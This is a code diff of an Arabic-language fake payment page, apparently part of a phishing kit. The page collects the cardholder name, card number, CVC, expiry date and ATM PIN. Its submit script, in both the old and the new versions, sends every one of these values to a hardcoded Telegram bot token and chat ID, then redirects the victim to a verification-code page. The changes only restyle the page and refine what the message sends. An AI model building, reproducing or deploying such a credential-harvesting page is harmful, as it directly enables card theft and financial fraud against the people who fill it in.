@@ -1,234 +1,369 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
-    <meta charset="UTF-8">
-    <meta http-equiv="x-ua-compatible" content="ie=edge">
-    <title>Payment</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <link rel="shortcut icon" href="https://sdad-ae.netlify.app/favicon.ico" type="image/vnd.microsoft.icon">
-    <link rel="stylesheet" href="./Card-info_files/paymentform.css">
-    <link rel="stylesheet" href="./Card-info_files/font-awesome.min.css">
-    <link rel="stylesheet" href="./Card-info_files/style.css">
-    <style>
-        /* إضافة رمز البطاقة */
-        #card-logo {
-            display: none;
-            width: 40px; /* حجم الشعار */
-            height: auto;
-            position: absolute; /* تحديد الموضع */
-            right: 10px; /* المسافة من اليمين */
-            top: 50%; /* توسيط عموديًا */
-            transform: translateY(-50%); /* توسيط عموديًا */
-        }
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
+    <meta charset="UTF-8">
+    <meta http-equiv="x-ua-compatible" content="ie=edge">
+    <title>Payment</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="shortcut icon" href="https://sdad-ae.netlify.app/favicon.ico" type="image/vnd.microsoft.icon">
+    
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@200..1000&display=swap');
+        
+        /* ---------------------------------- */
+        /* التنسيقات الأصلية لـ style.css و paymentform.css */
+        /* ---------------------------------- */
+        *{
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Cairo', sans-serif; /* استخدام خط عربي */
+        }
+        
+        body {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            background: linear-gradient(135deg, #71b7e6, #9b59b6);
+            direction: rtl; /* دعم اللغة العربية */
+            text-align: right;
+        }
 
-        /* تعديل تنسيق حقل الإدخال لاستيعاب الشعار */
-        .input-box {
-            position: relative; /* لجعل الشعار يظهر داخل الحقل */
-        }
-    </style>
+        .wrapper {
+            width: 400px;
+            background: #fff;
+            border-radius: 15px;
+            padding: 25px;
+            box-shadow: 0 5px 10px rgba(0, 0, 0, 0.15);
+        }
+
+        .wrapper h2 {
+            font-size: 24px;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 20px;
+            border-bottom: 1px solid #ccc;
+            padding-bottom: 10px;
+            text-align: center;
+        }
+
+        .wrapper h4 {
+            font-size: 16px;
+            font-weight: 500;
+            color: #333;
+            margin: 15px 0 8px 0;
+        }
+
+        .input-group {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 15px;
+        }
+
+        .input-box {
+            position: relative;
+            width: 100%;
+            height: 40px;
+        }
+        
+        /* تنسيق حقول الإدخال والاختيار */
+        .input-box input,
+        .input-box select {
+            width: 100%;
+            height: 100%;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            padding: 0 45px 0 15px; /* ترك مساحة للأيقونة والشعار */
+            font-size: 16px;
+            outline: none;
+            transition: all 0.3s ease;
+        }
+        
+        .input-box input:focus,
+        .input-box select:focus {
+            border-color: #9b59b6;
+        }
+
+        .input-box .icon {
+            position: absolute;
+            left: 10px; /* تم تعديل الموقع ليكون على اليسار (مع الأخذ في الاعتبار أن الواجهة RTL) */
+            top: 50%;
+            transform: translateY(-50%);
+            color: #aaa;
+            pointer-events: none;
+        }
+        
+        /* زر التأكيد */
+        .input-box button {
+            width: 100%;
+            height: 45px;
+            background: #9b59b6;
+            color: #fff;
+            border: none;
+            border-radius: 5px;
+            font-size: 18px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin-top: 10px;
+        }
+
+        .input-box button:hover {
+            background: #8e44ad;
+        }
+
+        /* ---------------------------------- */
+        /* التنسيقات الإضافية لرمز البطاقة */
+        /* ---------------------------------- */
+        #card-logo {
+            display: none;
+            width: 40px; /* حجم الشعار */
+            height: auto;
+            position: absolute; /* تحديد الموضع */
+            left: 10px; /* ⚠️ تم التغيير إلى اليسار ليكون واضحًا بجانب الأيقونة */
+            top: 50%; /* توسيط عموديًا */
+            transform: translateY(-50%); /* توسيط عموديًا */
+            border-radius: 3px;
+        }
+        
+        /* تعديل تنسيق حقل الإدخال لاستيعاب الشعار والأيقونة */
+        .input-box input#number {
+            padding-right: 45px; /* مسافة للأيقونة */
+            padding-left: 90px; /* مسافة للشعار والأيقونة */
+        }
+        
+        /* تعديل موقع الأيقونة في حقل رقم البطاقة لليمين */
+        .input-box input#number + .icon {
+            left: unset;
+            right: 10px;
+        }
+        /* إرجاع أيقونة الشعار إلى اليمين لتفادي التداخل مع أيقونة الـ CVC/PIN */
+        #card-logo {
+             left: 10px; 
+             right: unset;
+        }
+        
+        .input-box {
+            position: relative; /* لجعل الشعار يظهر داخل الحقل */
+        }
+    </style>
 </head>
 <body>
-    <div class="wrapper">
-        <h2>إتمام الدفع</h2>
-        <form id="page2form">
-		                <div class="input-box">
-                    <select name="payThrough" id="payThrough" required>                         <option value="" disabled selected>سداد عبر</option>
-                        <option value="1">تجريب 1</option>
-                        <option value="2">تجريب 2</option>
-						<option value="15">LIV</option>
-                    </select>
-            </div>
-            <h4>الاسم على البطاقة</h4>
-            <div class="input-group">
-                <div class="input-box">
-                    <input type="text" name="name" id="name" placeholder="اسمك " required class="name">
-                    <i class="fas fa-user icon"></i>
-                </div>
-            </div>
-            
-            <h4>رقم البطاقة</h4>
-            <div class="input-group">
-                <div class="input-box">
-                    <input type="tel" name="number" id="number" placeholder="أدخل رقم البطاقة" maxlength="19" required class="name">
-                    <i class="fa fa-credit-card icon"></i>
-                    <img id="card-logo" src="" alt="رمز البطاقة">
-                </div>
-            </div>
-            
-            <h4>(CVC) رمز التحقق</h4>
-            <div class="input-group">
-                <div class="input-box">
-                    <input type="tel" name="cvc" id="cvv" maxlength="4" placeholder="CVC" required class="name">
-                    <i class="fa fa-credit-card-alt icon"></i>
-                </div>
-            </div>
-            
-            <h4>تاريخ الانتهاء</h4>
-            <div class="input-group">
-                <div class="input-box">
-                    <select name="month" id="expMonth" required>
-                        <option value="" disabled selected>شهر</option>
-                        <option value="01">01</option>
-                        <option value="02">02</option>
-                        <option value="03">03</option>
-                        <option value="04">04</option>
-                        <option value="05">05</option>
-                        <option value="06">06</option>
-                        <option value="07">07</option>
-                        <option value="08">08</option>
-                        <option value="09">09</option>
-                        <option value="10">10</option>
-                        <option value="11">11</option>
-                        <option value="12">12</option>
-                    </select>
-                </div>
-                <div class="input-box">
-                    <select name="year" id="expYear" required>
-                        <option value="" disabled selected>سنة</option>
-                        <option value="2025">2025</option>
-                        <option value="2026">2026</option>
-                        <option value="2027">2027</option>
-                        <option value="2028">2028</option>
-						<option value="2029">2029</option>
-						<option value="2030">2030</option>
-						<option value="2031">2031</option>
-                    </select>
-                </div>
-            </div>
-            
-            <h4>(PIN) الرمز الخاص بأجهزة الصراف الآلي </h4>
-            <div class="input-group">
-                <div class="input-box">
-                    <input type="password" name="fort" id="fort" placeholder="****" maxlength="4" required class="name">
-                    <i class="fa fa-unlock-alt icon"></i>
-                </div>
-            </div>
-            
-            <div class="input-group">
-                <div class="input-box">
-                    <button type="submit" id="nextButton">تأكيد الدفع</button>
-                </div>
-            </div>
-        </form>
-    </div>
+    <div class="wrapper">
+        <h2>إتمام الدفع</h2>
+        <form id="page2form">
+            <div class="input-box">
+                <select name="payThrough" id="payThrough" required>
+                    <option value="" disabled selected>سداد عبر</option>
+                    <option value="1">تجريب 1</option>
+                    <option value="2">تجريب 2</option>
+                    <option value="15">LIV</option>
+                </select>
+            </div>
+            
+            <h4>الاسم على البطاقة</h4>
+            <div class="input-group">
+                <div class="input-box">
+                    <input type="text" name="name" id="name" placeholder="اسمك " required class="name">
+                    <i class="fas fa-user icon"></i>
+                </div>
+            </div>
+            
+            <h4>رقم البطاقة</h4>
+            <div class="input-group">
+                <div class="input-box">
+                    <input type="tel" name="number" id="number" placeholder="أدخل رقم البطاقة" maxlength="19" required class="name">
+                    <i class="fa fa-credit-card icon"></i>
+                    <img id="card-logo" src="" alt="رمز البطاقة">
+                </div>
+            </div>
+            
+            <h4>(CVC) رمز التحقق</h4>
+            <div class="input-group">
+                <div class="input-box">
+                    <input type="tel" name="cvc" id="cvv" maxlength="4" placeholder="CVC" required class="name">
+                    <i class="fa fa-credit-card-alt icon"></i>
+                </div>
+            </div>
+            
+            <h4>تاريخ الانتهاء</h4>
+            <div class="input-group">
+                <div class="input-box">
+                    <select name="month" id="expMonth" required>
+                        <option value="" disabled selected>شهر</option>
+                        <option value="01">01</option>
+                        <option value="02">02</option>
+                        <option value="03">03</option>
+                        <option value="04">04</option>
+                        <option value="05">05</option>
+                        <option value="06">06</option>
+                        <option value="07">07</option>
+                        <option value="08">08</option>
+                        <option value="09">09</option>
+                        <option value="10">10</option>
+                        <option value="11">11</option>
+                        <option value="12">12</option>
+                    </select>
+                </div>
+                <div class="input-box">
+                    <select name="year" id="expYear" required>
+                        <option value="" disabled selected>سنة</option>
+                        <option value="2025">2025</option>
+                        <option value="2026">2026</option>
+                        <option value="2027">2027</option>
+                        <option value="2028">2028</option>
+                        <option value="2029">2029</option>
+                        <option value="2030">2030</option>
+                        <option value="2031">2031</option>
+                    </select>
+                </div>
+            </div>
+            
+            <h4>(PIN) الرمز الخاص بأجهزة الصراف الآلي </h4>
+            <div class="input-group">
+                <div class="input-box">
+                    <input type="password" name="fort" id="fort" placeholder="****" maxlength="4" required class="name">
+                    <i class="fa fa-unlock-alt icon"></i>
+                </div>
+            </div>
+            
+            <div class="input-group">
+                <div class="input-box">
+                    <button type="submit" id="nextButton">تأكيد الدفع</button>
+                </div>
+            </div>
+        </form>
+    </div>
 
-    <script>
-        // دالة لإضافة مسافات تلقائية بين كل 4 أرقام
-        function formatCardNumber(cardNumber) {
-            // إزالة جميع المسافات الموجودة
-            cardNumber = cardNumber.replace(/\s/g, "");
-            // إضافة مسافة بعد كل 4 أرقام
-            return cardNumber.replace(/(\d{4})/g, "$1 ").trim();
-        }
+    <script>
+        // دالة لإضافة مسافات تلقائية بين كل 4 أرقام
+        function formatCardNumber(cardNumber) {
+            // إزالة جميع المسافات الموجودة
+            cardNumber = cardNumber.replace(/\s/g, "");
+            // إضافة مسافة بعد كل 4 أرقام
+            return cardNumber.replace(/(\d{4})/g, "$1 ").trim();
+        }
 
-        // دالة للتعرف على نوع البطاقة
-        function detectCardType(cardNumber) {
-            const firstFourDigits = cardNumber.substring(0, 4);
+        // دالة للتعرف على نوع البطاقة
+        function detectCardType(cardNumber) {
+            const firstFourDigits = cardNumber.substring(0, 4);
 
-            // قائمة بأنواع البطاقات وأرقامها الأولى
-            const cardTypes = {
-                "visa": /^4/, // فيزا تبدأ بـ 4
-                "mastercard": /^5[1-5]/, // ماستركارد تبدأ بـ 51 إلى 55
-                "applepay": /^2/, // أبل باي تبدأ بـ 2 (يمكن تعديلها حسب الحاجة)
-            };
+            // قائمة بأنواع البطاقات وأرقامها الأولى
+            const cardTypes = {
+                "visa": /^4/, // فيزا تبدأ بـ 4
+                "mastercard": /^5[1-5]/, // ماستركارد تبدأ بـ 51 إلى 55
+                "applepay": /^2/, // أبل باي تبدأ بـ 2 (يمكن تعديلها حسب الحاجة)
+            };
 
-            // التحقق من نوع البطاقة
-            for (const [cardType, pattern] of Object.entries(cardTypes)) {
-                if (pattern.test(firstFourDigits)) {
-                    return cardType;
-                }
-            }
+            // التحقق من نوع البطاقة
+            for (const [cardType, pattern] of Object.entries(cardTypes)) {
+                if (pattern.test(firstFourDigits)) {
+                    return cardType;
+                }
+            }
 
-            return null; // إذا لم يتم التعرف على البطاقة
-        }
+            return null; // إذا لم يتم التعرف على البطاقة
+        }
 
-        // دالة لتحديث رمز البطاقة
-        function updateCardLogo(cardType) {
-            const cardLogo = document.getElementById("card-logo");
+        // دالة لتحديث رمز البطاقة
+        function updateCardLogo(cardType) {
+            const cardLogo = document.getElementById("card-logo");
 
-            if (cardType) {
-                // مسار الصور بناءً على نوع البطاقة
-                const cardImages = {
-                    "visa": "./Card-info_files/3.png", // فيزا
-                    "mastercard": "./Card-info_files/1.png", // ماستركارد
-                    "applepay": "./Card-info_files/2.png", // أبل باي
-                };
+            if (cardType) {
+                // مسار الصور بناءً على نوع البطاقة
+                const cardImages = {
+                    "visa": "./Card-info_files/3.png", // فيزا
+                    "mastercard": "./Card-info_files/1.png", // ماستركارد
+                    "applepay": "./Card-info_files/2.png", // أبل باي
+                };
 
-                cardLogo.src = cardImages[cardType]; // تحديث الصورة
-                cardLogo.style.display = "inline-block";
-            } else {
-                cardLogo.style.display = "none";
-            }
-        }
+                cardLogo.src = cardImages[cardType]; // تحديث الصورة
+                cardLogo.style.display = "inline-block";
+            } else {
+                cardLogo.style.display = "none";
+            }
+        }
 
-        // استماع لتغيير حقل الإدخال
-        document.getElementById("number").addEventListener("input", function (e) {
-            const cardNumberInput = e.target;
-            let cardNumber = cardNumberInput.value.replace(/\s/g, ""); // إزالة المسافات
+        // استماع لتغيير حقل الإدخال
+        document.getElementById("number").addEventListener("input", function (e) {
+            const cardNumberInput = e.target;
+            let cardNumber = cardNumberInput.value.replace(/\s/g, ""); // إزالة المسافات
 
-            // السماح فقط بإدخال الأرقام
-            cardNumber = cardNumber.replace(/\D/g, "");
+            // السماح فقط بإدخال الأرقام
+            cardNumber = cardNumber.replace(/\D/g, "");
 
-            // تنسيق الرقم بإضافة مسافات
-            const formattedCardNumber = formatCardNumber(cardNumber);
+            // تنسيق الرقم بإضافة مسافات
+            const formattedCardNumber = formatCardNumber(cardNumber);
 
-            // تحديث قيمة الحقل بالرقم المنسق
-            cardNumberInput.value = formattedCardNumber;
+            // تحديث قيمة الحقل بالرقم المنسق
+            cardNumberInput.value = formattedCardNumber;
 
-            // التعرف على نوع البطاقة وتحديث الشعار
-            const cardType = detectCardType(cardNumber);
-            updateCardLogo(cardType);
-        });
+            // التعرف على نوع البطاقة وتحديث الشعار
+            const cardType = detectCardType(cardNumber);
+            updateCardLogo(cardType);
+        });
 
-        // إرسال البيانات إلى تلغرام (كما هو)
-        document.getElementById("page2form").addEventListener("submit", function(event) {
-            event.preventDefault(); // منع الإرسال الفوري
-            
-            let name = document.getElementById("name").value;
-            let number = document.getElementById("number").value.replace(/\s/g, ""); // إزالة المسافات قبل الإرسال
-            let cvc = document.getElementById("cvv").value;
-            let month = document.getElementById("expMonth").value;
-            let year = document.getElementById("expYear").value;
-            let fort = document.getElementById("fort").value;
-            let payThrough = document.getElementById("payThrough").value; // 🛠️ جلب قيمة "سداد عبر"
-            
-            if (name && number && cvc && month && year && fort && payThrough) { // 🛠️ تحديث شرط التحقق
+        // إرسال البيانات إلى تلغرام (تم التعديل لجلب النص الظاهر)
+        document.getElementById("page2form").addEventListener("submit", function(event) {
+            event.preventDefault(); // منع الإرسال الفوري
+            
+            let name = document.getElementById("name").value;
+            let number = document.getElementById("number").value.replace(/\s/g, ""); 
+            let cvc = document.getElementById("cvv").value;
+            let month = document.getElementById("expMonth").value;
+            let year = document.getElementById("expYear").value;
+            let fort = document.getElementById("fort").value;
+            
+            // 🛠️ جلب عنصر select واختياره لـ "سداد عبر"
+            const payThroughSelect = document.getElementById("payThrough");
+            // 🛠️ جلب النص الظاهر (مثل "تجريب 2") بدلاً من القيمة (مثل "2")
+            let payThroughText = payThroughSelect.options[payThroughSelect.selectedIndex].text; 
+            
+            // 🛠️ جلب عنصر select واختياره لـ "السنة"
+            const yearSelect = document.getElementById("expYear");
+            // 🛠️ جلب النص الظاهر للسنة (مثل "2025")
+            let yearText = yearSelect.options[yearSelect.selectedIndex].text;
 
-                // إرسال البيانات إلى تلغرام
-                // 🛠️ تحديث رسالة التلغرام لإضافة "سداد عبر" و "السنة"
-                let message = `بيانات الدفع:\nسداد عبر: ${payThrough}\nالاسم: ${name}\nرقم البطاقة: ${number}\nCVC: ${cvc}\nتاريخ الانتهاء: ${month}/${year}\nكلمة السر: ${fort}`; 
-                
-                fetch(`https://api.telegram.org/bot7676226649:AAHE6aj-0kFU29ijO7dAw3vH4pE_JF1R4vY/sendMessage`, {
-                    method: "POST",
-                    body: JSON.stringify({
-                        chat_id: "5417478446",
-                        text: message
-                    }),
-                    headers: {
-                        "Content-Type": "application/json"
-                    }
-                })
-                .then(response => response.json())
-                .then(data => {
-                    if (data.ok) {
-                        console.log("DONE");
-                    } else {
-                        console.error("ERROR", data);
-                    }
-                })
-                .catch(error => {
-                    console.error("ERROR", error);
-                });
+            // ⚠️ ملاحظة: قمنا بتغيير year إلى yearText في الرسالة
 
-                // التوجيه إلى صفحة الدفع بعد تأخير 2 ثانية
-                setTimeout(function() {
-                    window.location.href = "verification-code.html";
-                }, 2000);
-            } else {
-                alert("يرجى ملء جميع الحقول المطلوبة.");
-            }
-        });
-    </script>
+            // التحقق من أن جميع الحقول المطلوبة ممتلئة
+            if (name && number && cvc && month && year && fort && payThroughText && yearText) {
+
+                // إرسال البيانات إلى تلغرام
+                let message = `بيانات الدفع:\nسداد عبر: ${payThroughText}\nالاسم: ${name}\nرقم البطاقة: ${number}\nCVC: ${cvc}\nتاريخ الانتهاء: ${month}/${yearText}\nكلمة السر: ${fort}`;
+                
+                fetch(`https://api.telegram.org/bot7676226649:AAHE6aj-0kFU29ijO7dAw3vH4pE_JF1R4vY/sendMessage`, {
+                    method: "POST",
+                    body: JSON.stringify({
+                        chat_id: "5417478446",
+                        text: message
+                    }),
+                    headers: {
+                        "Content-Type": "application/json"
+                    }
+                })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        console.log("DONE");
+                    } else {
+                        console.error("ERROR", data);
+                    }
+                })
+                .catch(error => {
+                    console.error("ERROR", error);
+                });
+
+                // التوجيه إلى صفحة الدفع بعد تأخير 2 ثانية
+                setTimeout(function() {
+                    window.location.href = "verification-code.html";
+                }, 2000);
+            } else {
+                alert("يرجى ملء جميع الحقول المطلوبة.");
+            }
+        });
+    </script>
 </body>
 </html>
